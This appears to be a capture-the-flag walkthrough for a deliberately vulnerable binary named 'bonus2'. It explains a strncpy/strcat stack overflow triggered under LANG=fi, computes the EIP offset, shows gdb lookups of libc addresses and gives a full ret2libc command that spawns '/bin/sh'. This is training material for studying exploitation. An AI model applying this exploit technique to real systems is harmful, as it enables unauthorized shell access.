# Bonus 2 Walkthrough

## Vulnerability
The `bonus2` binary takes two command-line arguments and copies them into a static `76`-byte buffer in `main()` using `strncpy`. It copies `argv[1]` (up to 40 bytes) and `argv[2]` (up to 32 bytes). Because `strncpy` does not automatically append a null byte if the maximum size is reached, providing exactly `40` bytes for `argv[1]` results in `argv[1]` and `argv[2]` forming one contiguous 72-byte string.

The binary then calls `greetuser()`, which attempts to construct a localized greeting inside a `72`-byte local buffer (`ebp-0x48`). The language prefix is determined by the `LANG` environment variable:
- `fi` sets the language variable to `1`, using prefix `Hyvää päivää ` (18 characters).
- `nl` sets the language variable to `2`, using prefix `Goedemiddag `.
- Otherwise, the default is `Hello `.

The logic calls `strcat` with our user-controlled 72-byte string appended to this prefix buffer. 

For Finnish (`LANG="fi"`), the `18`-byte prefix, plus the `40`-byte `argv[1]`, places the start of our `argv[2]` at offset `58`. To overwrite the saved `EIP` of `greetuser`, we must overwrite exactly `76` bytes (`72` buffer + `4` saved `EBP`). 

$76 - 18 - 40 = 18$ bytes.
Therefore, byte `18` of `argv[2]` perfectly overwrites `EIP`!

## Exploit
We execute a standard buffer overflow. While we could use a NOPSled and Shellcode within an environment variable, using a `ret2libc` attack is much cleaner since we control the exact return address and have just enough space in `argv[2]` to fit a short ROP chain.

We need to fetch the address of `system` and the string `"/bin/sh"` from `libc`:
```bash
(gdb) print system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
(gdb) print exit
$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
(gdb) find &system, +9999999, "/bin/sh"
0xb7f8cc58
```

Since we only need `LANG=fi` for language `1` to provide `18` offset bytes, our attack chain becomes:
1. First Argument: `40 * 'A'`
2. Second Argument: `18 * 'B'` to pad exactly up to the `EIP` overwrite point.
3. Overwrite `EIP`: The address of `system()` (`\x60\xb0\xe6\xb7`).
4. Fake Return Address: The address of `exit()` (`\xe0\xeb\xe5\xb7`).
5. First Argument to `system()`: The address of `"/bin/sh"` (`\x58\xcc\xf8\xb7`).

```bash
env LANG="fi" ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 18 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"')
```
